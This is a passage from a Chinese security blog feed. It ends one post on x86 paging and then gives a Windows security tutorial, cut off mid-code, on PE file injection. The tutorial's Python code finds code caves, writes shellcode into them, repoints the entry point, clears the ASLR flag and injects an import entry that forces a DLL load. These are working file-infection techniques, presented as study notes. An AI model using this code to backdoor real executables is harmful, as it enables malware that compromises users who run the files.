PTE）标识页的属性。10-10-12分页实现了4GB线性地址到物理地址的一一映射，但是其最高只能寻址到4GB物理空间。2-9-9-12分页依旧是4GB线性地址映射到4GB物理地址，但是其最高寻址的物理地址范围增加到64GB。</p><p>第一次接触到内核这么底层深入的东西，一切都很陌生，虽然已经学过了汇编和操作系统，但是感觉对保护模式的运行理解起来还是比较吃力。首先在搭建环境上就栽了跟头，可能是因为VMWare设置的全局串口重复，导致使用Windbg连接后很容易就卡死，然后我只能把虚拟机VMX的进程杀了，但是这样做似乎会损坏系统，导致我再次连接时出现问题，重装了3次XP才终于弄清楚问题所在。。。</p><p>保护模式的入门学习就先到这里了，感觉学到的东西都只是简单的理解了原理，真正实践起来还是不熟练。感谢各位大佬的教程中的耐心讲解，下一篇应该是驱动和系统调用的学习，加油。</p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><ul><li>羽夏的博客： <a href="https://www.cnblogs.com/wingsummer/p/15308064.html">https://www.cnblogs.com/wingsummer/p/15308064.html</a></li><li>lzyddf的博客 <a href="https://blog.csdn.net/qq_41988448/article/details/102563325">https://blog.csdn.net/qq_41988448/article/details/102563325</a></li><li>周壑的视频教程： <a href="https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296">https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-段&quot;&gt;&lt;a href=&quot;#1-段&quot; class=&quot;headerlink&quot; title=&quot;1 段&quot;&gt;&lt;/a&gt;1 段&lt;/h2&gt;&lt;h3 id=&quot;1-1-段选择子&quot;&gt;&lt;a href=&quot;#1-1-段选择子&quot; class=&quot;headerlink&quot; title=&quot;1.1 段</summary>
      
    
    
    
    <category term="Windows" scheme="http://reop.cc/categories/Windows/"/>
    
    
  </entry>
  
  <entry>
    <title>注入、劫持和Hook——Windows安全入门（一）</title>
    <link href="http://reop.cc/2024/03/02/%E6%B3%A8%E5%85%A5%E3%80%81%E5%8A%AB%E6%8C%81%E5%92%8CHook%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://reop.cc/2024/03/02/%E6%B3%A8%E5%85%A5%E3%80%81%E5%8A%AB%E6%8C%81%E5%92%8CHook%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2024-03-02T03:21:00.000Z</published>
    <updated>2024-03-09T14:28:00.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-PE注入"><a href="#1-PE注入" class="headerlink" title="1 PE注入"></a>1 PE注入</h2><p>PE注入就是对静态的PE文件进行修改，使其在运行时能够加载我们需要的构造的代码。因为都是对文件进行静态的修改，只需要处理好RVA和Offset之间的转换，保证PE完整的结构就好，相对来说比较简单。<br>此部分代码都使用Python实现，使用pefile模块对PE文件进行操作，十分方便。当然因为PE的结构就是通过头文件定义的，使用C语言也很方便。</p><h3 id="1-1-寻找空洞"><a href="#1-1-寻找空洞" class="headerlink" title="1.1 寻找空洞"></a>1.1 寻找空洞</h3><p>寻找代码中的空闲区域的大小，作为PE注入前的参考。<br>参考了<em><strong>cave miner</strong></em>项目，但是我没有研究其源码，只是按照其原理通过比较节表中的 SizeOfRawData 和 Misc_VirtualSize 属性，实现了最简单的功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pefile <span class="keyword">import</span> PE  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_cave</span>(<span class="params">filename, minsize=<span class="number">0</span></span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    搜索代码空洞  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    caves = []  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] FileAlign:\t<span class="subst">&#123;pe.OPTIONAL_HEADER.FileAlignment&#125;</span>Bytes&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] SectAlign:\t<span class="subst">&#123;pe.OPTIONAL_HEADER.SectionAlignment&#125;</span>Bytes\n&quot;</span>)  </span><br><span class="line">    <span class="comment"># 1. Cave Before Sections  </span></span><br><span class="line">    sectionDataBegin = pe.sections[<span class="number">0</span>].PointerToRawData  </span><br><span class="line">    sectionTableEnd = pe.sections[-<span class="number">1</span>].__file_offset__ + pe.sections[-<span class="number">1</span>].sizeof()  </span><br><span class="line">    caveSize = sectionDataBegin - sectionTableEnd - <span class="number">40</span>  </span><br><span class="line">    RVA = sectionTableEnd  </span><br><span class="line">    flags = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">if</span> caveSize &gt; minsize:  </span><br><span class="line">       caves.append(  </span><br><span class="line">          [<span class="string">&#x27;BEFORE &#x27;</span> + pe.sections[<span class="number">0</span>].Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>), sectionTableEnd + <span class="number">40</span>, sectionDataBegin, caveSize, RVA,  </span><br><span class="line">           flags])  </span><br><span class="line">    <span class="comment"># 2. Cave In Each Sections  </span></span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:  </span><br><span class="line">       caveSize = section.SizeOfRawData - section.Misc_VirtualSize  </span><br><span class="line">       <span class="keyword">if</span> caveSize &gt; minsize:  </span><br><span class="line">          begin = section.PointerToRawData + section.Misc_VirtualSize  </span><br><span class="line">          RVA = section.VirtualAddress + section.Misc_VirtualSize  </span><br><span class="line">          flags = (section.Characteristics &amp; <span class="number">0xf0000000</span>) &gt;&gt; <span class="number">29</span>  </span><br><span class="line">          <span class="comment"># print(flags)  </span></span><br><span class="line">          caves.append([<span class="string">&#x27;IN &#x27;</span> + section.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>), begin, begin + caveSize, caveSize, RVA, flags])  </span><br><span class="line">    <span class="keyword">for</span> cave <span class="keyword">in</span> caves:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + cave[<span class="number">0</span>], end=<span class="string">&quot;:\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tBegin:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">1</span>])[<span class="number">2</span>:], end=<span class="string">&quot;h\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tEnd:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">2</span>])[<span class="number">2</span>:], end=<span class="string">&quot;h\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tSize:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">3</span>])[<span class="number">2</span>:] + <span class="string">&#x27;h (&#x27;</span> + <span class="built_in">str</span>(cave[<span class="number">3</span>]) + <span class="string">&#x27;Bytes)&#x27;</span>, end=<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tRVA:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">4</span>])[<span class="number">2</span>:], end=<span class="string">&quot;h\n&quot;</span>)  </span><br><span class="line">       flags = <span class="built_in">list</span>(<span class="string">&#x27;---&#x27;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cave[<span class="number">5</span>] &amp; <span class="number">4</span>:  </span><br><span class="line">          flags[<span class="number">0</span>] = <span class="string">&#x27;w&#x27;</span>  </span><br><span class="line">       <span class="keyword">if</span> cave[<span class="number">5</span>] &amp; <span class="number">2</span>:  </span><br><span class="line">          flags[<span class="number">1</span>] = <span class="string">&#x27;r&#x27;</span>  </span><br><span class="line">       <span class="keyword">if</span> cave[<span class="number">5</span>] &amp; <span class="number">1</span>:  </span><br><span class="line">          flags[<span class="number">2</span>] = <span class="string">&#x27;x&#x27;</span>  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tFlags:\t&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(flags), end=<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[Usage] python search.py &lt;filename&gt; [minsize]&quot;</span>)  </span><br><span class="line">       exit(<span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:  </span><br><span class="line">       search_cave(sys.argv[<span class="number">1</span>])  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">       search_cave(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><h3 id="1-2-注入shellcode"><a href="#1-2-注入shellcode" class="headerlink" title="1.2 注入shellcode"></a>1.2 注入shellcode</h3><p>向空洞中注入shellcode，然后修改OEP指向shellcode的入口。需要注意的是要确保注入点的节具有执行权限。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject_shellcode</span>(<span class="params">filename, offset, payload</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    代码空洞注入shellcode  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    rva = pe.get_rva_from_offset(offset)  </span><br><span class="line">    data_size = <span class="built_in">len</span>(payload) + <span class="number">5</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_size):  </span><br><span class="line">       <span class="keyword">if</span> pe.__data__[offset + i] != <span class="number">0</span>:  </span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[!] The cave is too small!&quot;</span>)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 添加call指令  </span></span><br><span class="line">    opcode = <span class="string">b&#x27;\xe8&#x27;</span> + (-data_size).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">True</span>)  </span><br><span class="line">    payload += opcode  </span><br><span class="line">    <span class="comment"># 修改OEP  </span></span><br><span class="line">    new_oep = rva + data_size - <span class="number">5</span>  </span><br><span class="line">    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_oep  </span><br><span class="line">    <span class="comment"># 关闭ASLR  </span></span><br><span class="line">    pe.OPTIONAL_HEADER.DllCharacteristics &amp;= <span class="number">0xff</span>  </span><br><span class="line">    <span class="comment"># 定位节  </span></span><br><span class="line">    inject_section = pe.sections[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:  </span><br><span class="line">       <span class="keyword">if</span> offset &lt;= section.PointerToRawData + section.SizeOfRawData:  </span><br><span class="line">          inject_section = section  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">    inject_section.Characteristics |= <span class="number">0xe0000000</span>  </span><br><span class="line">    <span class="comment"># 注入shellcode  </span></span><br><span class="line">    pe.__data__ = pe.__data__[:offset] + payload + pe.__data__[offset + <span class="built_in">len</span>(payload):]  </span><br><span class="line">    <span class="comment"># pe.set_data_bytes(offset, shellcode)  </span></span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_injected.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Injected PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-3-注入导入表"><a href="#1-3-注入导入表" class="headerlink" title="1.3 注入导入表"></a>1.3 注入导入表</h3><p>通过注入导入表使PE文件可以加载任意的DLL，但是导入表的后面一般没有足够的空间来添加表项，此时需要将原来的整个导入表复制到足够大的空洞处再新增表项，同时修改可选头中标识的导入表的RVA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject_import</span>(<span class="params">filename, offset</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    注入导入表  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    <span class="comment"># 复制旧IDT  </span></span><br><span class="line">    IDT_offset = pe.get_offset_from_rva(pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].VirtualAddress)  </span><br><span class="line">    IDT_size = pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].Size - <span class="number">20</span>  </span><br><span class="line">    IDT_data = pe.__data__[IDT_offset:IDT_offset+IDT_size]  </span><br><span class="line">    pe.set_data_bytes(offset, IDT_data)  </span><br><span class="line">    <span class="comment"># 新建一个IDT项  </span></span><br><span class="line">    begin = offset + IDT_size  </span><br><span class="line">    new_IDT = SectionStructure(pe.__IMAGE_IMPORT_DESCRIPTOR_format__)  </span><br><span class="line">    new_IDT.__unpack__(<span class="built_in">bytearray</span>(new_IDT.sizeof()))  </span><br><span class="line">    new_IDT.set_file_offset(begin)  </span><br><span class="line">    begin += <span class="number">40</span>  </span><br><span class="line">    <span class="comment"># INT  </span></span><br><span class="line">    new_IDT.OriginalFirstThunk = pe.get_rva_from_offset(begin)  </span><br><span class="line">    new_INT = SectionStructure(pe.__IMAGE_THUNK_DATA_format__)  </span><br><span class="line">    new_INT.__unpack__(<span class="built_in">bytearray</span>(new_INT.sizeof()))  </span><br><span class="line">    new_INT.set_file_offset(begin)  </span><br><span class="line">    begin += <span class="number">8</span>  </span><br><span class="line">    <span class="comment"># IAT  </span></span><br><span class="line">    new_IDT.FirstThunk = pe.get_rva_from_offset(begin)  </span><br><span class="line">    new_IAT = SectionStructure(pe.__IMAGE_THUNK_DATA_format__)  </span><br><span class="line">    new_IAT.__unpack__(<span class="built_in">bytearray</span>(new_IAT.sizeof()))  </span><br><span class="line">    new_IAT.set_file_offset(begin)  </span><br><span class="line">    begin += <span class="number">8</span>  </span><br><span class="line">    <span class="comment"># funcName  </span></span><br><span class="line">    funcName = <span class="string">b&#x27;\x00\x00show\x00&#x27;</span>  </span><br><span class="line">    pe.set_data_bytes(begin, funcName)  </span><br><span class="line">    new_INT.AddressOfData = pe.get_rva_from_offset(begin)  </span><br><span class="line">    new_IAT.AddressOfData = pe.get_rva_from_offset(begin)  </span><br><span class="line">    begin += <span class="built_in">len</span>(funcName) + <span class="number">3</span>  </span><br><span class="line">    <span class="comment"># dllName  </span></span><br><span class="line">    dllName = <span class="string">b&#x27;Hello.dll\x00&#x27;</span>  </span><br><span class="line">    pe.set_data_bytes(begin, dllName)  </span><br><span class="line">    new_IDT.Name = pe.get_rva_from_offset(begin)  </span><br><span class="line">    pe.__structures__.append(new_IDT)  </span><br><span class="line">    pe.__structures__.append(new_INT)  </span><br><span class="line">    pe.__structures__.append(new_IAT)  </span><br><span class="line">    <span class="comment"># 更改扩展头中的IDT的地址  </span></span><br><span class="line">    pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].VirtualAddress = pe.get_rva_from_offset(offset)  </span><br><span class="line">    pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].Size += <span class="number">20</span>  </span><br><span class="line">    <span class="comment"># 修改节权限  </span></span><br><span class="line">    inject_section = <span class="literal">None</span>  </span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:  </span><br><span class="line">       <span class="keyword">if</span> offset &lt;= section.PointerToRawData + section.SizeOfRawData:  </span><br><span class="line">          inject_section = section  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">    inject_section.Characteristics = <span class="number">0xc0000000</span>  </span><br><span class="line">    <span class="comment"># pe.merge_modified_section_data()  </span></span><br><span class="line">    <span class="comment">#  写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_dll.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-4-新增节"><a href="#1-4-新增节" class="headerlink" title="1.4 新增节"></a>1.4 新增节</h3><p>如果现有的代码空洞不足以进行注入，那么可以通过更改PE结构来开辟更多的空洞。<br>利用节表和节数据之间的空闲区域再新增一个节，网上有很多详细的讲解，这里就不再赘述。<br>为了不需要移动其他的节数据，一般是在文件末尾新增节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_section</span>(<span class="params">filename, data_size</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    新增节  </span></span><br><span class="line"><span class="string">    :return: offset of new section data  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    data_size += <span class="number">5</span>  </span><br><span class="line">    <span class="comment"># 计算是否足够新增节区头  </span></span><br><span class="line">    begin = pe.sections[-<span class="number">1</span>].__file_offset__ + pe.sections[-<span class="number">1</span>].sizeof()  </span><br><span class="line">    end = pe.sections[<span class="number">0</span>].PointerToRawData  </span><br><span class="line">    cave_size = end - begin  </span><br><span class="line">    <span class="comment"># data_size = len(shellcode) + 5  </span></span><br><span class="line">    <span class="keyword">if</span> cave_size &lt; <span class="number">80</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] There is not enough cave to add a section header.&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] There are <span class="subst">&#123;cave_size - <span class="number">40</span>&#125;</span> (<span class="subst">&#123;cave_size&#125;</span> - 40) bytes cave to add section header.&quot;</span>)  </span><br><span class="line">    <span class="comment"># 构造新的节表  </span></span><br><span class="line">    new_section = SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)  </span><br><span class="line">    new_section.__unpack__(<span class="built_in">bytearray</span>(new_section.sizeof()))  </span><br><span class="line">    new_section.set_file_offset(begin)  </span><br><span class="line">    new_section.Name = <span class="string">b&#x27;.new&#x27;</span>  </span><br><span class="line">    new_section.Misc_VirtualSize = data_size  </span><br><span class="line">    new_section.VirtualAddress = pe.sections[-<span class="number">1</span>].VirtualAddress + math.ceil(  </span><br><span class="line">       pe.sections[-<span class="number">1</span>].Misc_VirtualSize / pe.OPTIONAL_HEADER.SectionAlignment) * pe.OPTIONAL_HEADER.SectionAlignment  </span><br><span class="line">    new_section.SizeOfRawData = math.ceil(  </span><br><span class="line">       data_size / pe.OPTIONAL_HEADER.FileAlignment) * pe.OPTIONAL_HEADER.FileAlignment  </span><br><span class="line">    new_section.PointerToRawData = pe.sections[-<span class="number">1</span>].PointerToRawData + pe.sections[-<span class="number">1</span>].SizeOfRawData  </span><br><span class="line">    new_section.Characteristics = <span class="number">0x60000000</span>  </span><br><span class="line">    <span class="comment"># 修改节区数量和我文件大小  </span></span><br><span class="line">    pe.FILE_HEADER.NumberOfSections += <span class="number">1</span>  </span><br><span class="line">    pe.OPTIONAL_HEADER.SizeOfImage = math.ceil(pe.OPTIONAL_HEADER.SizeOfImage + pe.sections[  </span><br><span class="line">       -<span class="number">1</span>].Misc_VirtualSize / pe.OPTIONAL_HEADER.SectionAlignment) * pe.OPTIONAL_HEADER.SectionAlignment  </span><br><span class="line">      </span><br><span class="line">    <span class="comment"># 添加节头和节数据  </span></span><br><span class="line">    pe.__structures__.append(new_section)  </span><br><span class="line">    padding = <span class="string">b&#x27;\x00&#x27;</span> * new_section.SizeOfRawData  </span><br><span class="line">    <span class="comment"># pe.__data__ = pe.__data__[:] + padding  </span></span><br><span class="line">    pe.set_data_bytes(new_section.PointerToRawData, padding)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] New section added to PE file.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] FOA: <span class="subst">&#123;<span class="built_in">hex</span>(new_section.PointerToRawData)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] RVA: <span class="subst">&#123;<span class="built_in">hex</span>(new_section.VirtualAddress)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_modified.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> new_section.PointerToRawData</span><br></pre></td></tr></table></figure><h4 id="提升NT头"><a href="#提升NT头" class="headerlink" title="提升NT头"></a>提升NT头</h4><p>如果节表和节数据之间的空洞不足以再新增一个节，可以使用此方法将没用的DOS Stub段删除，将其后面的NT头整体上移覆盖掉这段数据，那么节表和节数据之间就可以腾出一些空洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lift_header</span>(<span class="params">filename</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    删除 dos_stub, 提升PE头  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    begin = pe.DOS_HEADER.sizeof()  </span><br><span class="line">    end = pe.NT_HEADERS.__file_offset__  </span><br><span class="line">    offset = pe.sections[<span class="number">0</span>].PointerToRawData  </span><br><span class="line">    height = end - begin  </span><br><span class="line">    <span class="keyword">if</span> height &lt;= <span class="number">0</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] No DOS stub to cover!&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 修改DOS头属性  </span></span><br><span class="line">    pe.DOS_HEADER.e_lfanew -= height  </span><br><span class="line">    pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()  </span><br><span class="line">    <span class="comment"># 上移头部覆盖dos_stub  </span></span><br><span class="line">    padding = <span class="string">b&#x27;\x00&#x27;</span> * height  </span><br><span class="line">    pe.__data__ = pe.__data__[:begin] + pe.__data__[end:offset] + padding + pe.__data__[offset:]  </span><br><span class="line">    <span class="comment">#  写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_lifted.exe&#x27;</span>)  </span><br><span class="line">    <span class="comment"># pe.write(modified_filename)  </span></span><br><span class="line">    <span class="built_in">open</span>(modified_filename, <span class="string">&#x27;wb&#x27;</span>).write(pe.__data__)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] File header lifted by <span class="subst">&#123;height&#125;</span> bytes.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-5-合并节"><a href="#1-5-合并节" class="headerlink" title="1.5 合并节"></a>1.5 合并节</h3><p>这个方法也是为了新增节，通过合并两个节，节表就会腾出一个位置用来存放新增的节。<br>同样，为了不影响其他节，合并最后两个节是最好的选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 